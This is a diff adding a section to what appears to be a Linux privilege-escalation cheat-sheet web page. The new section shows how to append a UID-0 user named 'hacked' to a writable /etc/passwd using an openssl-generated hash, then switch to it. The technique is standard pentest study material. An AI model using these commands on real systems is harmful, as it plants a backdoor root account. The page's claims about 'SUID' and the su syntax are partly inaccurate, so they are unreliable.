@@ -169,6 +169,18 @@ int main(){
                         <p>Based on the information gathered during enumration phase search for kernel exploit using the <b>kernel version</b> or the <b>operating system version</b></p>
                         <pre><code class="language-bash">uname -a</code></pre>
                     </ul>
+
+                    <h2 id="Modifyable /etc/passwd">Modifyable /etc/passwd</h2>
+                    <ul>
+                        <p>In some cases we may found an /etc/passwd file which can be modifyed in that case we could add a new user with SUID permisions of root </p>
+                        
+                        
+                        <pre><code class="language-bash">openssl passwd -1 -salt salt 1234</code></pre>
+                        <pre><code class="language-bash">echo "hacked:$1$salt$kqNI5AJoJdN1WgWoNslBD0:0:0:root:/root:/bin/bash" >> /etc/passwd</code></pre>
+                        <pre><code class="language-bash">su hacked 1234</code></pre>
+
+
+                    </ul>
         </div>
     </div>
 </body>
